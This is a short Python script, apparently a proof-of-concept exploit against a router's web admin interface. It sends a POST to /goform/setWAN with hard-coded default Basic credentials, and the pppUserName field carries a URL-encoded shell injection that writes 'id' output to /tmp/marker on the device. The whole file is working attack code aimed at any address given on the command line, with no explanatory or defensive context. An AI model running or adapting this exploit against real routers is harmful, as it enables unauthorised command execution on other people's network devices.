import socket
import sys

body = b'wanMode=2&pppUserName=%7Cid+%3E+%2Ftmp%2Fmarker+%23&submit-url=%2Fwan.asp'
request = (b'POST /goform/setWAN HTTP/1.1\r\n'
           b'Host: router.invalid\r\n'
           b'Authorization: Basic YWRtaW46MTIzNA==\r\n'
           b'Content-Type: application/x-www-form-urlencoded\r\n'
           b'Content-Length: ' + str(len(body)).encode() + b'\r\n\r\n' + body)
with socket.create_connection((sys.argv[1], 80), timeout=5) as client:
    client.sendall(request)
    print(client.recv(1024))
